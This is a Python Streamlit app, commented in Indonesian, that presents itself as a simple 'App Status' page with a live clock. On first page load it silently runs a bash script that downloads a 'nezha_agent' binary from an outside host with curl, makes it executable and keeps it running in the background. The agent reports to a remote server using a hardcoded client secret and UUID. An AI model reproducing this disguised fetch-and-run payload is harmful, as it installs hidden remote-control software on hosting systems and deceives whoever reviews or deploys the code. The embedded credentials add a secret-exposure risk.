import streamlit as st
import subprocess
from datetime import datetime
import time

# --- Konfigurasi Halaman ---
st.set_page_config(
    page_title="App Status",
    page_icon="🟢",
    layout="centered"
)

# --- Perintah Shell Paling Kuat (Menggunakan Lock File & /proc) ---
# Ini adalah metode paling andal untuk lingkungan yang sangat minimalis.
COMMAND_TO_RUN_ONCE = """
# Tentukan lokasi file lock/PID
PID_FILE="/tmp/agent.pid"

# Langkah 1: Unduh dan siapkan file agent HANYA jika belum ada.
if [ ! -f agent ]; then
    echo "File 'agent' tidak ditemukan, mengunduh..."
    curl -L https://alice.mxflower.eu.org/d/CF%20R2/database/nezha_agent -o agent && chmod +x agent
fi

# Langkah 2: Periksa apakah agent sudah berjalan menggunakan metode lock file.
# Kondisi: Jalankan JIKA (file PID tidak ada) ATAU (file PID ada TAPI direktori /proc/PID-nya tidak ada).
if [ ! -f $PID_FILE ] || ! kill -0 $(cat $PID_FILE) > /dev/null 2>&1; then
    echo "Proses 'agent' tidak berjalan atau file PID sudah usang. Memulai ulang..."
    
    # Jalankan agent di latar belakang
    nohup env NZ_SERVER=vps-monitor.fly.dev:443 \
        NZ_TLS=true \
        NZ_CLIENT_SECRET=CqmryaDkXPUPoRtdGE8NvfGhjEOLu2b9 \
        NZ_UUID=61aeceff-7479-49a9-9900-32df80905be8 \
        ./agent > /dev/null 2>&1 &
    
    # Segera tangkap PID dari proses yang baru dibuat dan simpan ke file lock.
    # $! adalah variabel shell spesial yang berisi PID dari proses background terakhir.
    echo $! > $PID_FILE
    
else
    echo "Proses 'agent' sudah berjalan dengan PID $(cat $PID_FILE)."
fi
"""

# --- Logika Eksekusi Otomatis ---

if 'agent_triggered' not in st.session_state:
    st.session_state.agent_triggered = False

if not st.session_state.agent_triggered:
    try:
        st.info("🚀 Memeriksa status agent di latar belakang...")
        
        subprocess.Popen(COMMAND_TO_RUN_ONCE, shell=True, executable='/bin/bash')
        
        st.session_state.agent_triggered = True
        
        st.toast("Pemeriksaan agent selesai!", icon="👍")
        time.sleep(2)
        
        st.rerun()

    except Exception as e:
        st.error(f"❌ Terjadi kesalahan saat memeriksa/memulai agent:")
        st.code(str(e))
        st.stop()


# --- Tampilan Utama (UI) ---

st.title("🟢 App Status")
st.success("Aplikasi berjalan. Agent telah diperiksa dan aktif di latar belakang.")
st.markdown("---")

clock_placeholder = st.empty()

while True:
    now = datetime.now()
    clock_placeholder.metric(
        label="Waktu Server Saat Ini",
        value=now.strftime("%H:%M:%S"),
        delta=now.strftime('%d %B %Y'),
        delta_color="off"
    )
    time.sleep(1)
